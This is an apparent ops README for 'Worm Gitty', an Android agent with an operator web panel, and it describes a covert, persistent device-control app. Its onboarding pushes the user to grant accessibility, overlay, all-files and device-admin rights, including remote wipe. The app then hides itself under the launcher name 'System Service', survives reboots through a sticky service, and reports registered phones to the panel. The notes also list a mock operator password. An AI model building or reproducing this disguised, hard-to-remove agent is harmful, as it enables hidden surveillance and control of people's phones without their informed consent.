# OPS

## Android

### Flow
1. Launch (via `LauncherBoost` alias, red, "Worm Gitty") -> intro bubbles "أهلاً بيك" / "هناخد دقيقة واحدة بس" with 600ms typing dots.
2. Name: 2..40 chars, Next disabled until valid.
3. Checklist rows, each opens its own intent: overlay, accessibility, all-files, battery-opt, device-admin, notifications. Re-checked on every `ON_RESUME`. Next blocked until overlay + accessibility + battery-opt + device-admin are green.
4. Phone: normalized to E.164 (+20 default), 10..15 digits.
5. Summary + "قفل": `RegistrationApi.register` -> outbox JSONL, registration persisted, black veil 2000ms, `WormSvc` started, launcher alias switched, activity finishes.
6. Relaunch after seal: 2000ms black veil -> `WormSvc` -> `LauncherBoost` disabled / `LauncherHidden` ("خدمة النظام") enabled with `DONT_KILL_APP` -> finish.

### Components
| Component | Notes |
|-----------|-------|
| `WormSvc` | foregroundServiceType=specialUse, `PROPERTY_SPECIAL_USE_FGS_SUBTYPE=device agent`, `START_STICKY`, channel `IMPORTANCE_MIN`, heartbeat row to `filesDir/heartbeat.log` every 60s |
| `BootRcv` | BOOT_COMPLETED + LOCKED_BOOT_COMPLETED + MY_PACKAGE_REPLACED; swallows `ForegroundServiceStartNotAllowedException` |
| `SecretRcv` | dial `*#*#2468#*#*` -> `StatusActivity` (read-only: alias state, service alive, last heartbeat, phone) |
| `AdminRcv` | `DeviceAdminReceiver`, policies wipe-data + force-lock in `res/xml/device_admin.xml` |

### Debug
- Secrets: heartbeat age shows at `*#*#2468#*#*`.
- Registrations outbox: `adb shell run-as com.wormgitty.agent cat files/registrations/queue.jsonl`
- Heartbeat: `adb shell run-as com.wormgitty.agent cat files/heartbeat.log`
- Alias state: `adb shell pm list packages -e | grep wormgitty` or the status screen.

## Panel

### Token handling
- Access token: memory only (`src/lib/api.js`).
- Refresh token: `localStorage["refresh_token"]`.
- On 401: exactly one `/api/auth/refresh` + retry of the original call; if refresh dies, purge and redirect `#/login`.
- 429: cooldown banner, 30s countdown then auto reload. 500: retry button. Network down: offline banner.

### Mocks
- MSW worker generated by `npx msw init public`.
- Fixtures: `panel/mocks/fixtures/index.js` (3 devices, operator `ops@wormgitty.local` / `w0rm-gitty-pass`).
- Fault injection for tests: `window.__wg_fault` (`status/attemptsLeft`, `auth401Left`, `refreshFail`); request log: `window.__wg_captured`.

## Gate

`scripts/gate.sh` runs, in order:
```
android: ./gradlew test lint connectedDebugAndroidTest
panel:   npm ci && npm test && npx playwright test
```
Any failure exits non-zero. CI mirrors it in two jobs and uploads reports on `always()`.
